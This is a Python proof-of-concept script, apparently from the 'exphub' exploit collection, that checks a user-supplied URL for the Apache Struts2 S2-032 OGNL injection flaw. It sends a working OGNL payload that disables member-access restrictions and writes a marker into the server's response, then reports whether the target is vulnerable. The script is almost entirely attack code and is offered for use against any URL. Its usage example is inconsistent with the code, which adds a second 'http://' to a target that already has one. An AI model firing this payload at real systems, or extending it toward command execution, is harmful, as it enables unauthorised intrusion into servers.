#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author(cn):之乎者也
# author(en):zhzyker
# from:https://github.com/zhzyker/exphub
# telegram:t.me/zhzyker
# qq(群):219291257

import requests
import sys
import time

TM = 10
if len(sys.argv)!=2:
    print('+-------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub        +')
    print('+-------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url>                               +')
    print('+ EXP: python3 struts2-032_poc.py http://freeerror.org:8080   +')
    print('+ VER: Struts 2.x < 2.3.20.2                                  +')
    print('+      Struts 2.3.28.x < 2.3.28.1                             +')
    print('+      Struts 2.3.24.x < 2.3.24.2                             +')
    print('+-------------------------------------------------------------+')
    sys.exit()
tmpurl = sys.argv[1]
url = "http://" + tmpurl
poc='032'
payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '', 'poc': poc}
try:
    r = requests.get(url, params=payload, timeout=TM)
except:
    print ("[-] The target does not have Struts2-032 vulnerability")
    exit()

if poc in r.text:
	print("\033[1;31m[+] Struts2-032 vulnerability exists\033[0m")

else:
	print("[-] The target does not have Struts2-032 vulnerability")